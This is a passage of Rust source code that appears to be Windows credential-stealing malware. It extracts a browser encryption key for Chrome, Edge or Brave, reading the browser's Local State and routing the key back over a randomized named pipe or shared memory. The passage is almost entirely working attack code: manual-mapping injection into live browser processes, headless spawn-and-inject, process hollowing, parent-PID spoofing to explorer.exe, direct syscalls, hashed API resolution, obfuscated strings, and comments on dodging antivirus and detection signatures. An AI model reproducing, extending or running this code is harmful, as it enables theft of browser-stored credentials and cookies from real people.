        wait_for_single_object: match tf(resolve(k32, crate::api!("WaitForSingleObject"))) {
            Some(f) => f,
            None => return fail(&mut rep, "resolve"),
        },
        terminate_process: match tf(resolve(k32, crate::api!("TerminateProcess"))) {
            Some(f) => f,
            None => return fail(&mut rep, "resolve"),
        },
        nt_query_information_process: match tf(resolve(&ntdll, crate::api!("NtQueryInformationProcess"))) {
            Some(f) => f,
            None => return fail(&mut rep, "resolve"),
        },
        nt_unmap_view_of_section: match tf(resolve(&ntdll, crate::api!("NtUnmapViewOfSection"))) {
            Some(f) => f,
            None => return fail(&mut rep, "resolve"),
        },
    };

    // Named pipe for the helper's key output. With a spoofed parent the child
    // inherits handles from the spoofed parent, not from us, so the helper
    // cannot receive an inherited anonymous pipe and connects here itself.
    // The name is randomized per run; a static pipe prefix is a signature.
    // Null DACL: creator and browser may run as different principals
    // (SYSTEM agent vs user browser) — a default-DACL pipe was unreachable
    // from the browser in the field.
    let mut sd_buf = [0u8; 64];
    let world_sa = build_world_sd(&mut sd_buf);
    let sa_ptr = world_sa
        .as_ref()
        .map_or(std::ptr::null(), |sa| sa as *const SecurityAttributes as *const c_void);
    let pipe_name = format!("{}{}", crate::obf!("\\\\.\\pipe\\"), random_pipe_suffix());
    let pipe_w = wide(&pipe_name);
    let pipe = create_named_pipe_w(
        pipe_w.as_ptr(),
        PIPE_ACCESS_INBOUND,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT | PIPE_REJECT_REMOTE_CLIENTS,
        1,
        4096,
        4096,
        0,
        sa_ptr as *mut c_void,
    );
    if pipe.is_null() || pipe as isize == -1 {
        return fail(&mut rep, &format!("pipe={}", last_error()));
    }
    let pipe_guard = HandleGuard(pipe);

    // Shared-memory fallback result channel (pipe-independent).
    let shm = create_shm_channel(sa_ptr);
    let shm_name: String = shm.as_ref().map(|s| s.name.clone()).unwrap_or_default();

    let Some((image, pe)) = build_helper_image() else {
        return fail(&mut rep, "img_build");
    };

    // Preferred path: a browser process is already running — manual-map the
    // helper into it and run it as a remote thread. No new process, no
    // hollowing. If the key doesn't arrive, fall through to spawn/hollow.
    let mut inj_reason: Option<String> = None;
    let mut any_running = false;
    let exe_name = exe
        .file_name()
        .and_then(|n| n.to_str())
        .map(|s| s.to_owned());
    let thread_rva = find_export_rva(&image, pe.export_rva, &crate::obf!("run_thread"));
    match (exe_name, thread_rva) {
        (Some(exe_name), Some(thread_rva)) => {
            let pids = find_process_ids(&exe_name);
            any_running = !pids.is_empty();
            if pids.is_empty() {
                inj_reason = Some("no_running_browser".to_string());
            }
            for pid in pids {
                if let Some(s) = &shm {
                    s.clear();
                }
                match inject_into_running(
                    pid,
                    &exe,
                    &local_state,
                    canonical,
                    &pipe_name,
                    &shm_name,
                    &image,
                    &pe,
                    thread_rva,
                    &ops,
                ) {
                    Ok(exit_code) => {
                        let (key, helper_fail) =
                            collect_result(pipe, peek_named_pipe, read_file, &shm);
                        if let Some(key) = key {
                            rep.path = "inj";
                            return (Some(key), rep);
                        }
                        inj_reason = Some(helper_fail.unwrap_or_else(|| {
                            if exit_code == STILL_ACTIVE {
                                "timeout".to_string()
                            } else {
                                format!("exit={}", exit_code)
                            }
                        }));
                    }
                    Err(r) => inj_reason = Some(r),
                }
            }
        }
        _ => inj_reason = Some("no_export".to_string()),
    }

    // Second path: no instance running — spawn the browser NORMALLY and
    // inject into it once up. Headless flags first (no window), minimized
    // about:blank as the fallback variant. Skipped when an instance IS
    // running: a second launch would just hand off to it and exit.
    let mut spawn_reason: Option<String> = None;
    if !any_running {
        if let Some(thread_rva) = thread_rva {
            for headless in [true, false] {
                match spawn_and_inject(
                    &exe,
                    &local_state,
                    canonical,
                    &pipe_name,
                    &shm_name,
                    &image,
                    &pe,
                    thread_rva,
                    &ops,
                    create_process_w,
                    pipe,
                    peek_named_pipe,
                    read_file,
                    &shm,
                    headless,
                ) {
                    Ok(key) => {
                        rep.path = if headless { "spawn:headless" } else { "spawn:min" };
                        if !headless {
                            // The headless variant failed first; keep why.
                            rep.inj_note =
                                spawn_reason.take().map(|r| format!("spawn:{}", r));
                        }
                        return (Some(key), rep);
                    }
                    Err(r) => {
                        // Each variant reports distinctly: "headless:<r>+min:<r>".
                        let v = format!(
                            "{}:{}",
                            if headless { "headless" } else { "min" },
                            r
                        );
                        spawn_reason = Some(match spawn_reason.take() {
                            Some(prev) => format!("{}+{}", prev, v),
                            None => v,
                        });
                    }
                }
            }
        }
    }

    // Fallback: spawn the real browser binary suspended and hollow it.
    // Benign-looking command line: the real browser image plus our helper
    // arguments. The elevation service validates the process image path
    // (lpApplicationName), not the command line.
    let cmdline = format!(
        "\"{}\" \"{}\" {} \"{}\" \"{}\"",
        exe.display(),
        local_state.display(),
        canonical,
        pipe_name,
        shm_name
    );
    let exe_w = wide(&exe.to_string_lossy());
    let mut cmdline_w = wide(&cmdline);

    let mut si: StartupInfoW = std::mem::zeroed();
    si.cb = std::mem::size_of::<StartupInfoW>() as u32;
    si.dw_flags = STARTF_USESHOWWINDOW;
    si.w_show_window = 0; // SW_HIDE

    let mut pi: ProcessInformation = std::mem::zeroed();

    // Best-effort parent-PID spoof: parent the browser process to
    // explorer.exe so it does not appear as our child. Any spoof-setup
    // failure falls back to the plain suspended creation.
    let mut spoof = prepare_parent_spoof(&si);
    let used_spoof = spoof.is_some();
    let mut created = match spoof.as_mut() {
        Some(s) => create_process_w(
            exe_w.as_ptr(),
            cmdline_w.as_mut_ptr(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut s.si_ex as *mut StartupInfoExW as *mut StartupInfoW,
            &mut pi,
        ),
        None => create_process_w(
            exe_w.as_ptr(),
            cmdline_w.as_mut_ptr(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut si,
            &mut pi,
        ),
    };
    // The attribute list and parent handle are only needed for creation.
    drop(spoof);
    if created == 0 && used_spoof {
        // Extended creation failed (e.g. attribute rejected): retry plain.
        pi = std::mem::zeroed();
        created = create_process_w(
            exe_w.as_ptr(),
            cmdline_w.as_mut_ptr(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut si,
            &mut pi,
        );
    }
    if created == 0 {
        return fail(
            &mut rep,
            &chain_reason(&inj_reason, &spawn_reason, &format!("create={}", last_error())),
        );
    }
    let proc_guard = HandleGuard(pi.h_process);
    let thread_guard = HandleGuard(pi.h_thread);

    // From here on the child always gets terminated before we return.
    if let Some(s) = &shm {
        s.clear();
    }
    let resumed = hollow_and_resume(pi.h_process, pi.h_thread, &image, &pe, &ops);
    if resumed {
        ops.wait(pi.h_process, WAIT_TIMEOUT_MS);
    }
    let child_exit = exit_code_process(pi.h_process);
    ops.terminate(pi.h_process);

    let (key, helper_fail) = collect_result(pipe, peek_named_pipe, read_file, &shm);

    drop(proc_guard);
    drop(thread_guard);
    drop(pipe_guard);

    if let Some(key) = key {
        rep.path = "hol";
        // Hollow succeeded, but earlier-stage failures are still worth
        // reporting (field AV blocking the quieter paths).
        rep.inj_note = fallback_notes(&inj_reason, &spawn_reason);
        return (Some(key), rep);
    }
    let hol_reason = if let Some(hf) = helper_fail {
        hf
    } else if !resumed {
        "hollow_map".to_string()
    } else if child_exit == STILL_ACTIVE {
        "timeout".to_string()
    } else {
        format!("exit={}", child_exit)
    };
    fail(&mut rep, &chain_reason(&inj_reason, &spawn_reason, &hol_reason))
}

/// Notes about earlier-stage failures when a later stage succeeded.
fn fallback_notes(inj: &Option<String>, spawn: &Option<String>) -> Option<String> {
    let mut parts: Vec<String> = Vec::new();
    if let Some(i) = inj {
        if i != "no_running_browser" {
            parts.push(format!("inj:{}", i));
        }
    }
    if let Some(s) = spawn {
        parts.push(format!("spawn:{}", s));
    }
    if parts.is_empty() {
        None
    } else {
        Some(parts.join("|"))
    }
}

/// Full failure chain: `inj:<r>|spawn:<r>|hol:<r>`, skipping stages that were
/// never attempted or had nothing to report.
fn chain_reason(inj: &Option<String>, spawn: &Option<String>, hol: &str) -> String {
    let mut parts: Vec<String> = Vec::new();
    if let Some(i) = inj {
        parts.push(format!("inj:{}", i));
    }
    if let Some(s) = spawn {
        parts.push(format!("spawn:{}", s));
    }
    parts.push(format!("hol:{}", hol));
    parts.join("|")
}

const STILL_ACTIVE: u32 = 259;

// Spawn-and-inject: job object so only the tree we spawned is killed.
const JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE: u32 = 0x2000;
const JOB_OBJECT_EXTENDED_LIMIT_INFORMATION: u32 = 9;
const JOBOBJECT_EXTENDED_LIMIT_INFORMATION_SIZE: u32 = 144;
const SW_SHOWMINNOACTIVE: u16 = 7;

type CreateJobObjectWFn = unsafe extern "system" fn(*mut c_void, *const u16) -> Handle;
type SetInformationJobObjectFn =
    unsafe extern "system" fn(Handle, u32, *const c_void, u32) -> i32;
type AssignProcessToJobObjectFn = unsafe extern "system" fn(Handle, Handle) -> i32;
type TerminateJobObjectFn = unsafe extern "system" fn(Handle, u32) -> i32;

/// Kill-on-close job + the spawned process/thread handles. Dropping
/// terminates exactly the tree we spawned and nothing else.
struct SpawnGuard {
    job: Handle,
    process: Handle,
    thread: Handle,
    /// False when AssignProcessToJobObject failed: then the job does not
    /// cover the process and it must be terminated directly.
    assigned: bool,
}

impl Drop for SpawnGuard {
    fn drop(&mut self) {
        unsafe {
            if !self.job.is_null() {
                let fp = resolve("kernel32.dll", crate::api!("TerminateJobObject"));
                if fp != 0 {
                    let f: TerminateJobObjectFn = std::mem::transmute(fp);
                    f(self.job, 0);
                }
            }
            if !self.assigned && !self.process.is_null() {
                let fp = resolve("kernel32.dll", crate::api!("TerminateProcess"));
                if fp != 0 {
                    let f: TerminateProcessFn = std::mem::transmute(fp);
                    f(self.process, 0);
                }
            }
            dyn_close_handle(self.job);
            dyn_close_handle(self.process);
            dyn_close_handle(self.thread);
        }
    }
}

/// Spawn the browser NORMALLY (no suspension, no hollowing) and inject the
/// helper into it once it is up. `headless` selects the flag set: the
/// headless variant opens no window at all; the fallback variant opens a
/// minimized, inactive about:blank window. The browser runs with a throwaway
/// --user-data-dir in %TEMP% (removed on the way out) so the real profile is
/// never touched (no "Restore pages" prompt from the kill). The spawned tree
/// is killed via the job object on the way out, whichever way we return.
#[allow(clippy::too_many_arguments)]
unsafe fn spawn_and_inject(
    exe: &Path,
    local_state: &Path,
    canonical: &str,
    pipe_name: &str,
    shm_name: &str,
    image: &[u8],
    pe: &PeInfo,
    run_thread_rva: u32,
    ops: &RemoteOps,
    create_process_w: CreateProcessWFn,
    pipe: Handle,
    peek_named_pipe: PeekNamedPipeFn,
    read_file: ReadFileFn,
    shm: &Option<ShmChannel>,
    headless: bool,
) -> Result<Vec<u8>, String> {
    let temp_profile = std::env::temp_dir().join(format!("xf-{}", random_pipe_suffix()));
    let r = spawn_and_inject_inner(
        exe,
        local_state,
        canonical,
        pipe_name,
        shm_name,
        image,
        pe,
        run_thread_rva,
        ops,
        create_process_w,
        pipe,
        peek_named_pipe,
        read_file,
        shm,
        headless,
        &temp_profile,
    );
    // The spawned tree is dead by here (guard dropped in inner); the
    // throwaway profile goes with it. Best-effort, with retries: the job
    // kill is asynchronous and children may still hold files briefly.
    for _ in 0..8 {
        if std::fs::remove_dir_all(&temp_profile).is_ok() || !temp_profile.exists() {
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(400));
    }
    r
}

#[allow(clippy::too_many_arguments)]
unsafe fn spawn_and_inject_inner(
    exe: &Path,
    local_state: &Path,
    canonical: &str,
    pipe_name: &str,
    shm_name: &str,
    image: &[u8],
    pe: &PeInfo,
    run_thread_rva: u32,
    ops: &RemoteOps,
    create_process_w: CreateProcessWFn,
    pipe: Handle,
    peek_named_pipe: PeekNamedPipeFn,
    read_file: ReadFileFn,
    shm: &Option<ShmChannel>,
    headless: bool,
    temp_profile: &Path,
) -> Result<Vec<u8>, String> {
    let k32 = "kernel32.dll";
    let create_job: CreateJobObjectWFn = match tf(resolve(k32, crate::api!("CreateJobObjectW"))) {
        Some(f) => f,
        None => return Err("job_resolve".to_string()),
    };
    let set_info: SetInformationJobObjectFn =
        match tf(resolve(k32, crate::api!("SetInformationJobObject"))) {
            Some(f) => f,
            None => return Err("job_resolve".to_string()),
        };
    let assign: AssignProcessToJobObjectFn =
        match tf(resolve(k32, crate::api!("AssignProcessToJobObject"))) {
            Some(f) => f,
            None => return Err("job_resolve".to_string()),
        };

    let job = create_job(std::ptr::null_mut(), std::ptr::null());
    if job.is_null() {
        return Err(format!("job_create={}", last_error()));
    }
    // JOBOBJECT_EXTENDED_LIMIT_INFORMATION: LimitFlags at offset 16.
    let mut limit = [0u8; JOBOBJECT_EXTENDED_LIMIT_INFORMATION_SIZE as usize];
    limit[16..20].copy_from_slice(&JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE.to_le_bytes());
    if set_info(
        job,
        JOB_OBJECT_EXTENDED_LIMIT_INFORMATION,
        limit.as_ptr() as *const c_void,
        limit.len() as u32,
    ) == 0
    {
        dyn_close_handle(job);
        return Err("job_set".to_string());
    }

    let args = if headless {
        format!(
            "--headless=new --disable-gpu --no-first-run --no-default-browser-check --remote-debugging-port=0 --disable-extensions --disable-sync --metrics-recording-only --mute-audio --user-data-dir=\"{}\" about:blank",
            temp_profile.display()
        )
    } else {
        format!(
            "--start-minimized --no-first-run --no-default-browser-check --disable-extensions --disable-sync --metrics-recording-only --mute-audio --user-data-dir=\"{}\" about:blank",
            temp_profile.display()
        )
    };
    let cmdline = format!("\"{}\" {}", exe.display(), args);
    let exe_w = wide(&exe.to_string_lossy());
    let mut cmdline_w = wide(&cmdline);
    let dir_w = exe.parent().map(|p| wide(&p.to_string_lossy()));

    let mut si: StartupInfoW = std::mem::zeroed();
    si.cb = std::mem::size_of::<StartupInfoW>() as u32;
    si.dw_flags = STARTF_USESHOWWINDOW;
    si.w_show_window = if headless { 0 } else { SW_SHOWMINNOACTIVE };
    let flags = if headless { CREATE_NO_WINDOW } else { 0 };

    let mut pi: ProcessInformation = std::mem::zeroed();
    if create_process_w(
        exe_w.as_ptr(),
        cmdline_w.as_mut_ptr(),
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        0,
        flags,
        std::ptr::null_mut(),
        dir_w.as_ref().map_or(std::ptr::null(), |d| d.as_ptr()),
        &mut si,
        &mut pi,
    ) == 0
    {
        dyn_close_handle(job);
        return Err(format!("create={}", last_error()));
    }
    let assigned = assign(job, pi.h_process) != 0;
    let guard = SpawnGuard {
        job,
        process: pi.h_process,
        thread: pi.h_thread,
        assigned,
    };

    // Let the browser process come up, then inject; a few retries cover slow
    // init on cold machines. The helper itself is fast once running.
    std::thread::sleep(std::time::Duration::from_millis(1200));
    let mut last = "inject_skip".to_string();
    for attempt in 0..3 {
        if attempt > 0 {
            std::thread::sleep(std::time::Duration::from_millis(800));
        }
        if exit_code_process(pi.h_process) != STILL_ACTIVE {
            return Err("died".to_string());
        }
        if let Some(s) = shm {
            s.clear();
        }
        match inject_into_running(
            pi.dw_process_id,
            exe,
            local_state,
            canonical,
            pipe_name,
            shm_name,
            image,
            pe,
            run_thread_rva,
            ops,
        ) {
            Ok(exit_code) => {
                let (key, helper_fail) = collect_result(pipe, peek_named_pipe, read_file, shm);
                if let Some(key) = key {
                    return Ok(key);
                }
                last = helper_fail.unwrap_or_else(|| {
                    if exit_code == STILL_ACTIVE {
                        "timeout".to_string()
                    } else {
                        format!("exit={}", exit_code)
                    }
                });
            }
            Err(r) => last = r,
        }
    }
    drop(guard);
    Err(last)
}

unsafe fn last_error() -> u32 {
    let fp = resolve("kernel32.dll", crate::api!("GetLastError"));
    if fp == 0 {
        return u32::MAX;
    }
    let f: unsafe extern "system" fn() -> u32 = std::mem::transmute(fp);
    f()
}

/// Thread exit code (STILL_ACTIVE if the timeout elapsed with it running,
/// u32::MAX if the query itself failed).
unsafe fn exit_code_thread(h: Handle) -> u32 {
    let fp = resolve("kernel32.dll", crate::api!("GetExitCodeThread"));
    if fp == 0 {
        return u32::MAX;
    }
    let f: unsafe extern "system" fn(Handle, *mut u32) -> i32 = std::mem::transmute(fp);
    let mut code = u32::MAX;
    f(h, &mut code);
    code
}

unsafe fn exit_code_process(h: Handle) -> u32 {
    let fp = resolve("kernel32.dll", crate::api!("GetExitCodeProcess"));
    if fp == 0 {
        return u32::MAX;
    }
    let f: unsafe extern "system" fn(Handle, *mut u32) -> i32 = std::mem::transmute(fp);
    let mut code = u32::MAX;
    f(h, &mut code);
    code
}

/// Exe file version "major.minor.build.patch" via version.dll
/// (VS_FIXEDFILEINFO root block).
fn file_version(exe: &Path) -> Option<String> {
    type SizeFn = unsafe extern "system" fn(*const u16, *mut u32) -> u32;
    type InfoFn = unsafe extern "system" fn(*const u16, u32, u32, *mut c_void) -> i32;
    type QueryFn = unsafe extern "system" fn(*const c_void, *const u16, *mut *mut c_void, *mut u32) -> i32;
    unsafe {
        let vdll = crate::obf!("version.dll");
        let a_size = resolve(&vdll, crate::api!("GetFileVersionInfoSizeW"));
        let a_info = resolve(&vdll, crate::api!("GetFileVersionInfoW"));
        let a_query = resolve(&vdll, crate::api!("VerQueryValueW"));
        if a_size == 0 || a_info == 0 || a_query == 0 {
            return None;
        }
        let get_size: SizeFn = std::mem::transmute(a_size);
        let get_info: InfoFn = std::mem::transmute(a_info);
        let query: QueryFn = std::mem::transmute(a_query);
        let path_w = wide(&exe.to_string_lossy());
        let size = get_size(path_w.as_ptr(), std::ptr::null_mut());
        if size == 0 || size > 16 * 1024 * 1024 {
            return None;
        }
        let mut buf = vec![0u8; size as usize];
        if get_info(path_w.as_ptr(), 0, size, buf.as_mut_ptr() as *mut c_void) == 0 {
            return None;
        }
        let root_w = wide("\\");
        let mut fi: *mut c_void = std::ptr::null_mut();
        let mut fi_len: u32 = 0;
        if query(buf.as_ptr() as *const c_void, root_w.as_ptr(), &mut fi, &mut fi_len) == 0
            || fi.is_null()
            || (fi_len as usize) < 16
        {
            return None;
        }
        // VS_FIXEDFILEINFO: dwSignature, dwStrucVersion, dwFileVersionMS, dwFileVersionLS
        let ms = (fi as *const u8).add(8) as *const u32;
        let ls = (fi as *const u8).add(12) as *const u32;
        let (ms, ls) = (ms.read_unaligned(), ls.read_unaligned());
        Some(format!(
            "{}.{}.{}.{}",
            ms >> 16,
            ms & 0xFFFF,
            ls >> 16,
            ls & 0xFFFF
        ))
    }
}

/// Collect whatever the helper wrote to the pipe (nothing if it never
/// connected). Peek first: ReadFile on a server end with no client would
/// block forever.
unsafe fn drain_pipe(
    pipe: Handle,
    peek_named_pipe: PeekNamedPipeFn,
    read_file: ReadFileFn,
) -> Vec<u8> {
    let mut out: Vec<u8> = Vec::with_capacity(128);
    let mut buf = [0u8; 256];
    loop {
        let mut avail: u32 = 0;
        if peek_named_pipe(
            pipe,
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
            &mut avail,
            std::ptr::null_mut(),
        ) == 0
            || avail == 0
        {
            break;
        }
        let mut n: u32 = 0;
        if read_file(pipe, buf.as_mut_ptr(), buf.len() as u32, &mut n, std::ptr::null_mut()) == 0
            || n == 0
        {
            break;
        }
        out.extend_from_slice(&buf[..n as usize]);
        if out.len() >= MAX_PIPE_READ {
            break;
        }
    }
    out
}

/// Random pipe name suffix: 8 random lowercase letters + pid/nanos.
/// Entropy: rdtsc mixed with GetTickCount64 and the wall clock (same
/// approach as jitter.rs; no rand crate).
fn random_pipe_suffix() -> String {
    let tsc = unsafe {
        let lo: u32;
        let hi: u32;
        core::arch::asm!("rdtsc", out("eax") lo, out("edx") hi);
        ((hi as u64) << 32) | lo as u64
    };
    let tick = unsafe {
        let f = resolve("kernel32.dll", crate::api!("GetTickCount64"));
        if f != 0 {
            let f: unsafe extern "system" fn() -> u64 = std::mem::transmute(f);
            f()
        } else {
            0
        }
    };
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.subsec_nanos() as u64)
        .unwrap_or(0);
    let mut x = tsc ^ tick.rotate_left(17) ^ nanos.rotate_left(31) ^ 0x9e3779b97f4a7c15;
    if x == 0 {
        x = 0x2545f4914f6cdd1d;
    }
    let mut letters = String::with_capacity(8);
    for _ in 0..8 {
        // xorshift64*
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        letters.push((b'a' + (x % 26) as u8) as char);
    }
    format!(
        "{}-{:08x}{:08x}",
        letters,
        std::process::id(),
        nanos as u32
    )
}

/// Loose display-name matching to the helper's canonical browser names.
fn canonical_browser_name(name: &str) -> Option<&'static str> {
    let n = name.to_ascii_lowercase();
    if n.contains("chrome") {
        Some("chrome")
    } else if n.contains("edge") {
        Some("edge")
    } else if n.contains("brave") {
        Some("brave")
    } else {
        None
    }
}

fn find_browser_exe(canonical: &str) -> Option<PathBuf> {
    let (rel, envs): (String, &[&str]) = match canonical {
        "chrome" => (
            crate::obf!("Google\\Chrome\\Application\\chrome.exe"),
            &["ProgramFiles", "ProgramFiles(x86)", "LOCALAPPDATA"],
        ),
        "edge" => (
            crate::obf!("Microsoft\\Edge\\Application\\msedge.exe"),
            &["ProgramFiles(x86)", "ProgramFiles", "LOCALAPPDATA"],
        ),
        "brave" => (
            crate::obf!("BraveSoftware\\Brave-Browser\\Application\\brave.exe"),
            &["ProgramFiles", "ProgramFiles(x86)", "LOCALAPPDATA"],
        ),
        _ => return None,
    };
    for var in envs {
        if let Ok(base) = std::env::var(var) {
            let p = Path::new(&base).join(&rel);
            if p.is_file() {
                return Some(p);
            }
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Injection into an already-running browser process (preferred path)
// ---------------------------------------------------------------------------

/// Open a browser process for injection: direct NtOpenProcess when the SSN
/// table resolved, hash-resolved OpenProcess otherwise. Null on failure.
unsafe fn open_remote_process(pid: u32) -> Handle {
    if let Some(nt) = syscall::nt_ops() {
        let cid = syscall::ClientId {
            unique_process: pid as usize,
            unique_thread: 0,
        };
        let oa = syscall::ObjectAttributes::new(std::ptr::null());
        let mut h: usize = 0;
        if nt.open_process(&mut h, PROCESS_INJECT_ACCESS, &oa, &cid) >= 0 && h != 0 {
            return h as Handle;
        }
    }
    let fp = resolve("kernel32.dll", crate::api!("OpenProcess"));
    if fp == 0 {
        return std::ptr::null_mut();
    }
    let f: OpenProcessFn = std::mem::transmute(fp);
    f(PROCESS_INJECT_ACCESS, 0, pid)
}

/// Manual-map the helper image into `h_process` at a kernel-chosen base and
/// flip it to executable. Returns the remote base. The helper is linked
/// /FIXED:NO /DYNAMICBASE: an empty .reloc directory therefore means the
/// image has no absolute address references at all (position-independent,
/// no fixups needed), not that fixups were stripped.
unsafe fn map_image_remote(
    h_process: Handle,
    image: &[u8],
    pe: &PeInfo,
    ops: &RemoteOps,
) -> Result<usize, String> {
    let base = ops.alloc_ex(h_process, 0, image.len(), PAGE_READWRITE);
    if base.is_null() {
        return Err(format!("map_alloc={}", last_error()));
    }
    let base = base as usize;
    let mut patched: Vec<u8>;
    let final_image: &[u8] = if base as u64 != pe.preferred_base && pe.reloc_size != 0 {
        patched = image.to_vec();
        if apply_relocations(
            &mut patched,
            pe.reloc_rva,
            pe.reloc_size,
            (base as u64).wrapping_sub(pe.preferred_base),
        )
        .is_none()
        {
            ops.free_ex(h_process, base);
            return Err("map_reloc".to_string());
        }
        &patched
    } else {
        image
    };
    if !ops.write(h_process, base, final_image) {
        ops.free_ex(h_process, base);
        return Err("map_write".to_string());
    }
    if !ops.protect_ex(h_process, base, final_image.len(), PAGE_EXECUTE_READ) {
        ops.protect_ex(h_process, base, final_image.len(), PAGE_EXECUTE_READWRITE);
    }
    Ok(base)
}

/// Run the helper inside an already-running browser process. The helper's
/// arguments are passed as the remote thread's parameter (a staged wide
/// command line in the target's address space) — GetCommandLineW returns a
/// pointer cached at process init, so patching the PEB command line of a
/// live process is invisible to it. The helper runs at its `run_thread`
/// export, which returns instead of ExitProcess, so the browser keeps
/// running. Ok(thread exit code) when the helper thread actually started and
/// finished (the key itself still arrives over the named pipe); Err(reason)
/// with a compact failure stage for telemetry.
#[allow(clippy::too_many_arguments)]
unsafe fn inject_into_running(
    pid: u32,
    exe: &Path,
    local_state: &Path,
    canonical: &str,
    pipe_name: &str,
    shm_name: &str,
    image: &[u8],
    pe: &PeInfo,
    run_thread_rva: u32,
    ops: &RemoteOps,
) -> Result<u32, String> {
    let h = open_remote_process(pid);
    if h.is_null() {
        return Err(format!("open={}", last_error()));
    }
    let h = HandleGuard(h);

    // Same argument shape as the hollowed-child command line.
    let cmdline = format!(
        "\"{}\" \"{}\" {} \"{}\" \"{}\"",
        exe.display(),
        local_state.display(),
        canonical,
        pipe_name,
        shm_name
    );
    let cmd_w = wide(&cmdline);
    let mut cmd_bytes = Vec::with_capacity(cmd_w.len() * 2);
    for unit in &cmd_w {
        cmd_bytes.extend_from_slice(&unit.to_le_bytes());
    }
    let cmd_base = ops.alloc_ex(h.0, 0, cmd_bytes.len(), PAGE_READWRITE);
    if cmd_base.is_null() {
        return Err(format!("arg_alloc={}", last_error()));
    }
    let cmd_base = cmd_base as usize;

    let result: Result<u32, String>;
    if !ops.write(h.0, cmd_base, &cmd_bytes) {
        result = Err("arg_write".to_string());
    } else {
        match map_image_remote(h.0, image, pe, ops) {
            Ok(img_base) => {
                let thread =
                    ops.create_thread(h.0, img_base + run_thread_rva as usize, cmd_base);
                if thread.is_null() {
                    result = Err(format!("thread={}", last_error()));
                } else {
                    ops.wait(thread, WAIT_TIMEOUT_MS);
                    let code = exit_code_thread(thread);
                    dyn_close_handle(thread);
                    result = Ok(code);
                }
                ops.free_ex(h.0, img_base);
            }
            Err(r) => result = Err(r),
        }
    }

    ops.free_ex(h.0, cmd_base);
    result
}

// ---------------------------------------------------------------------------
// Hollowing
// ---------------------------------------------------------------------------

unsafe fn hollow_and_resume(
    h_process: Handle,
    h_thread: Handle,
    image: &[u8],
    pe: &PeInfo,
    ops: &RemoteOps,
) -> bool {
    let mut pbi: ProcessBasicInformation = std::mem::zeroed();
    if !ops.query_basic_info(h_process, &mut pbi) || pbi.peb_base_address.is_null() {
        return false;
    }

    let peb_base_ptr = pbi.peb_base_address.add(PEB_IMAGE_BASE_OFFSET);
    let Some(remote_base_u64) = ops.read_u64(h_process, peb_base_ptr as usize) else {
        return false;
    };
    let remote_base = remote_base_u64 as usize;
    if remote_base == 0 {
        return false;
    }

    // Preferred plan: map the helper at its preferred base WITHOUT unmapping
    // the browser image. Classic hollowing (unmap + reuse the image base)
    // breaks COM local-server activation: with the original SEC_IMAGE mapping
    // gone, ole32/server-side checks on the process image fail with
    // ERROR_BAD_EXE_FORMAT. Keeping the real browser image mapped (and the
    // PEB untouched) preserves them. The tiny no-std helper may have no
    // .reloc section, in which case it is only runnable at its preferred
    // base anyway. Pages are allocated RW and flipped to RX after the write —
    // RWX private regions are a high-fidelity hollowing indicator.
    let mut alloc_base: u64 = 0;
    let a = ops.alloc_ex(h_process, pe.preferred_base, image.len(), PAGE_READWRITE);
    if !a.is_null() {
        alloc_base = a as usize as u64;
    }

    // Fallback: classic hollowing. Unmap the browser image, reuse its base
    // (relocating the helper if it has a .reloc section), and fix up the PEB.
    let mut unmapped = false;
    if alloc_base == 0 {
        ops.unmap(h_process, remote_base);
        unmapped = true;
        for base in [remote_base as u64, pe.preferred_base, 0] {
            let a = ops.alloc_ex(h_process, base, image.len(), PAGE_READWRITE);
            if a.is_null() {
                continue;
            }
            let got = a as usize as u64;
            if got == pe.preferred_base || pe.reloc_size != 0 {
                alloc_base = got;
                break;
            }
            // Landed somewhere unusable and cannot relocate; leave the
            // reservation (the child is about to be terminated) and keep
            // trying.
        }
    }
    if alloc_base == 0 {
        return false;
    }

    let mut patched: Vec<u8>;
    let final_image: &[u8] = if alloc_base != pe.preferred_base {
        if pe.reloc_size == 0 {
            return false; // cannot relocate an image without .reloc
        }
        patched = image.to_vec();
        if apply_relocations(
            &mut patched,
            pe.reloc_rva,
            pe.reloc_size,
            alloc_base.wrapping_sub(pe.preferred_base),
        )
        .is_none()
        {
            return false;
        }
        &patched
    } else {
        image
    };

    if !ops.write(h_process, alloc_base as usize, final_image) {
        return false;
    }

    // Keep the PEB consistent only if we actually replaced the image.
    if unmapped && alloc_base as usize != remote_base {
        if !ops.write(
            h_process,
            peb_base_ptr as usize,
            &alloc_base.to_le_bytes(),
        ) {
            return false;
        }
    }

    // Flip the written image to RX before resuming. If the protect fails
    // (either path), fall back to RWX rather than fail the hollow.
    if !ops.protect_ex(h_process, alloc_base as usize, final_image.len(), PAGE_EXECUTE_READ) {
        ops.protect_ex(
            h_process,
            alloc_base as usize,
            final_image.len(),
            PAGE_EXECUTE_READWRITE,
        );
    }

    let mut ctx: Context = std::mem::zeroed();
    ctx.context_flags = CONTEXT_FULL_X64;
    if !ops.get_ctx(h_thread, &mut ctx) {
        return false;
    }
    ctx.rcx = alloc_base + pe.entry_rva as u64;
    if !ops.set_ctx(h_thread, &ctx) {
        return false;
    }
    ops.resume(h_thread)
}

// ---------------------------------------------------------------------------
// Helper PE image construction (headers + sections + imports + relocations)
// ---------------------------------------------------------------------------

struct PeInfo {
    entry_rva: u32,
    preferred_base: u64,
    reloc_rva: u32,
    reloc_size: u32,
    export_rva: u32,
}

fn rd_u16(b: &[u8], off: usize) -> Option<u16> {
    Some(u16::from_le_bytes(b.get(off..off.checked_add(2)?)?.try_into().ok()?))
}

